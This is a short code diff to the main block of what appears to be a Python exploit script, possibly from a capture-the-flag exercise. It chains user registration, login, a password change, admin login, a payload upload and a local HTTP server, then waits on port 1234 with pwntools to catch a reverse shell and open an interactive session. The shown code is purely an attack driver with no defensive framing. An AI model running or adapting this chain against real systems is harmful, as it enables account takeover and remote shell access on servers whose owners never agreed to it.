@@ -100,12 +100,14 @@ def conection():
     r = s.get(ip)
 
 if __name__ == '__main__':
+    html_payload()
+    http_server()
+    sleep(1)
     register()
     login()
     changePass()
     loginadmin()
     upload()
-    html_payload()
     threading.Thread(target=conection, args=()).start()
     shell = listen(1234,timeout=20).wait_for_connection()
     shell.interactive()
